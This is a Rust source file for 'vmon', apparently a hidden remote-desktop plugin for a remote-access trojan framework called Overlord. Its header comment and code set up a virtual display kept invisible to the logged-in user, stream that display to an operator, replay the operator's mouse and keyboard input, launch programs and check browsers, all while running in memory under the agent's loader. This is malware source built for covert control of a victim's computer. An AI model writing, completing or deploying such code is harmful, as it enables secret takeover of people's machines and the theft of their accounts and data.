/*
 * vmon — Virtual Monitor plugin for Overlord.
 *
 * A hidden remote-desktop session: attaches an IddCx virtual display to the
 * interactive session (invisible to the user — far-off coordinates, no
 * taskbar), captures it with DXGI Desktop Duplication, encodes H.264 through
 * the Media Foundation hardware MFT, and streams frames out as plugin events.
 * Operator input comes back the same way and lands via PostMessage on windows
 * living on the virtual display.
 *
 * Runs fully in-memory under Overlord's native plugin loader (emulated TLS,
 * static CRT, build-std). The stock agent is never modified.
 *
 * Wire events emitted (via host callback, JSON payloads):
 *   "vmon_status"  {"stage": "...", ...}        lifecycle/errors
 *   "vmon_frame"   {"seq": u32, "key": bool, "ts": i64, "data": base64}
 *   "vmon_apps"    {"apps": [{name, exe, icon?}]}
 *
 * Events accepted (via PluginOnEvent):
 *   "ping"                         → vmon_status pong
 *   "start"   {width, height, fps, bitrate_kbps}
 *   "stop"
 *   "keyframe"
 *   "input"   {kind: mouse_move|mouse_down|mouse_up|wheel|key_down|key_up|text, ...}
 *   "launch"  {path, args?}
 *   "list_apps"
 */

use std::os::raw::c_int;
use std::slice;
use std::sync::atomic::{AtomicI32, Ordering};

pub mod apps;
pub mod display;
pub mod emutls;
pub mod input;
pub mod stream;
mod wsclient;

/// Virtual display desktop rect, set once the display is attached. Input
/// translation (display-relative → absolute screen coords) depends on it.
pub static DISP_X: AtomicI32 = AtomicI32::new(0);
pub static DISP_Y: AtomicI32 = AtomicI32::new(0);
pub static DISP_W: AtomicI32 = AtomicI32::new(1920);
pub static DISP_H: AtomicI32 = AtomicI32::new(1080);

type HostCallback = unsafe extern "stdcall" fn(
    event: *const u8,
    event_len: usize,
    payload: *const u8,
    payload_len: usize,
);

static mut G_CALLBACK: Option<HostCallback> = None;
static mut CMD_TX: Option<std::sync::mpsc::Sender<stream::Command>> = None;

pub fn send_json(event: &str, value: &serde_json::Value) {
    let bytes = serde_json::to_vec(value).unwrap_or_default();
    unsafe {
        if let Some(cb) = G_CALLBACK {
            cb(event.as_ptr(), event.len(), bytes.as_ptr(), bytes.len());
        }
    }
}

pub fn status(stage: &str) {
    send_json("vmon_status", &serde_json::json!({ "stage": stage }));
}

// ---------------------------------------------------------------------------
// ABI exports
// ---------------------------------------------------------------------------

#[no_mangle]
pub extern "C" fn PluginGetRuntime() -> *const u8 {
    b"rust\0".as_ptr()
}

#[no_mangle]
pub unsafe extern "C" fn PluginSetCallback(callback: u64) {
    G_CALLBACK = Some(std::mem::transmute::<u64, HostCallback>(callback));
}

#[no_mangle]
pub unsafe extern "C" fn PluginOnLoad(
    _host_info: *const u8,
    _host_info_len: c_int,
    callback: u64,
) -> c_int {
    if callback != 0 {
        G_CALLBACK = Some(std::mem::transmute::<u64, HostCallback>(callback));
    }
    status("loaded");
    0
}

#[no_mangle]
pub unsafe extern "C" fn PluginOnUnload() -> c_int {
    if let Some(tx) = CMD_TX.take() {
        let _ = tx.send(stream::Command::Stop);
    }
    // Belt and braces: if the plugin unloads mid-stream, restore the display
    // topology immediately rather than waiting for the capture thread.
    if !stream::STREAMING.load(Ordering::SeqCst) {
        display::detach_display();
    }
    0
}

#[no_mangle]
pub unsafe extern "C" fn PluginOnEvent(
    event: *const u8,
    event_len: c_int,
    payload: *const u8,
    payload_len: c_int,
) -> c_int {
    if event.is_null() || event_len <= 0 {
        return 1;
    }
    let ev = slice::from_raw_parts(event, event_len as usize);
    let body: serde_json::Value = if payload.is_null() || payload_len <= 0 {
        serde_json::json!({})
    } else {
        let raw = slice::from_raw_parts(payload, payload_len as usize);
        serde_json::from_slice(raw).unwrap_or_else(|_| serde_json::json!({}))
    };
    match ev {
        b"ping" => {
            status("pong");
            0
        }
        b"start" => {
            if stream::STREAMING.load(Ordering::SeqCst) {
                status("already_streaming");
                return 0;
            }
            let cfg = stream::StreamConfig {
                width: body.get("width").and_then(|v| v.as_u64()).unwrap_or(1920) as u32,
                height: body.get("height").and_then(|v| v.as_u64()).unwrap_or(1080) as u32,
                fps: body.get("fps").and_then(|v| v.as_u64()).unwrap_or(30) as u32,
                bitrate_kbps: body.get("bitrate_kbps").and_then(|v| v.as_u64()).unwrap_or(4000) as u32,
                ws_url: body
                    .get("ws_url")
                    .and_then(|v| v.as_str())
                    .unwrap_or("")
                    .to_string(),
            };
            let (tx, rx) = std::sync::mpsc::channel::<stream::Command>();
            CMD_TX = Some(tx);
            std::thread::spawn(move || stream::run(cfg, rx));
            0
        }
        b"stop" => {
            if let Some(tx) = CMD_TX.take() {
                let _ = tx.send(stream::Command::Stop);
            }
            0
        }
        b"keyframe" => {
            stream::KEYFRAME_REQUESTED.store(true, Ordering::SeqCst);
            0
        }
        b"input" => {
            input::handle(&body);
            0
        }
        b"list_apps" => {
            std::thread::spawn(apps::list_apps);
            0
        }
        b"browser_check" => {
            std::thread::spawn(apps::browser_check);
            0
        }
        b"launch" => {
            let path = body.get("path").and_then(|v| v.as_str()).unwrap_or("");
            if path.is_empty() {
                return 1;
            }
            let args = body.get("args").and_then(|v| v.as_str()).map(|s| s.to_string());
            let path = path.to_string();
            std::thread::spawn(move || apps::launch(&path, args.as_deref()));
            0
        }
        _ => 1,
    }
}
